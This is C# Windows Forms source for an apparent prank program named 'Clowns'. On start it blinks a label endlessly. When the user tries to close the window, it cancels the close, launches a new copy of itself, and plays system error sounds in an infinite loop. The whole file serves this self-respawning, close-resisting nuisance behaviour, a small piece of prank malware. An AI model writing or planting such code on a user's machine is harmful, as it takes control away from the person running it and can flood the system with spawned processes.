using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Diagnostics;

namespace Clowns
{
    public partial class Form1 : Form
    {

        bool playingErrors = false;
        public Form1()
        {
            
            InitializeComponent();
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            for ( ; ; )
            {
                await Task.Delay(1000);
                label2.Visible = false;
                await Task.Delay(1000);
                label2.Visible = true;
            }
        }

        private async void closeButtonPress(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Process.Start(Process.GetCurrentProcess().ProcessName);
            if (playingErrors == true) return;
            else
            {
                playingErrors = true;
                for ( ; ; )
                {
                    await Task.Delay(1000);
                    SystemSounds.Hand.Play();
                    await Task.Delay(1000);
                    SystemSounds.Asterisk.Play();
                }
            }
        }
    }
}
